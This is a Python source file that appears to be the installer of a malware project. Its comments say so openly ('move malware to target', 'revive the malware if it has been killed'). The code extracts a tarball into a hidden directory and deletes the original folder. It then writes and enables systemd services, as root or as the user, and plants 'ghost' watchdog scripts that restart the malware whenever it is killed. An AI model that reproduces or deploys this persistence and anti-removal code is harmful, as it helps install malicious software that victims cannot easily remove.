#!/usr/bin/python
import config
import os
import tarfile

# true if root priviledges false otherwise
isRoot = os.popen("echo $USER").read()=="root\n"
ghostDir = config.root["ghostDir"] if isRoot else config.user["ghostDir"] + "."
ghostDir = os.path.expanduser(ghostDir)
targetDir = config.root["targetDir"] if isRoot else config.user["targetDir"] + "."
targetDir = os.path.expanduser(targetDir) + config.dirName + "/"
serviceDir = config.root["serviceDir"] if isRoot else config.user["serviceDir"]
serviceDir = os.path.expanduser(serviceDir)

serviceTemplate = "[Unit]\nDescription={desc}\n[Service]\nType=simple\nExecStart=/usr/bin/python3 {path}"

serviceList = [i[1] for i in config.ghosts] + [config.serviceName]

#fuction to remove a directory
def rem(target):
	if os.path.isfile(target):
		os.remove(target)

	else:
		for i in os.listdir(target):
			rem(target + "/" + i)
		os.rmdir(target)


# compress all files into tarbll for easy distribution
# out: output file
def compress(out):
	file = tarfile.open(out, "w")
	for i in os.listdir():
		if os.path.isfile(i) and i != out:
			file.add(i)
	file.close()

# move malware to target
# source: tarball to use
# force: overwrite if target folder exists
# clear: remove old files
def move(source, force=False, clear=True):
	if os.path.exists(targetDir):
		if force:
			for i in os.listdir(targetDir):
				os.remove(targetDir+i)
			os.rmdir(targetDir)
		else:
			return

	os.mkdir(targetDir)

	with tarfile.open(source,"r") as file:
		file.extractall(targetDir)

	if clear:
		rem(os.path.abspath("."))

# creates and enables a service to auto run
# runFile: file service will run
# serviceName: name of service file
# desc: description of the service
def createService(runFile, serviceName, desc, start=False):
	data = serviceTemplate.format(desc=desc, path=runFile)

	if not os.path.exists(serviceDir):
		os.makedirs(serviceDir)

	with open(serviceDir + serviceName + ".service", "w") as file:
		file.write(data)

	if isRoot:
		os.system("systemctl enable " + serviceName)
		if start:
			os.system("systemctl start " + serviceName)
	else:
		os.system("systemctl --user enable " + serviceName)
		if start:
			os.system("systemctl --user start " + serviceName)

# creates a service and programm which will revive the malware if it has been killed
# fileName: name for ghost software
# serviceName: name of service
# desc: description of service
def createGhost(fileName, serviceName, desc):
	with open("ghost.py") as file:
		data = file.read()

	data = data.format(services=serviceList, sleepTime=10, service="{service}")

	with open(ghostDir+fileName, "w") as file:
		file.write(data)

	createService(ghostDir+fileName, serviceName, desc, True)

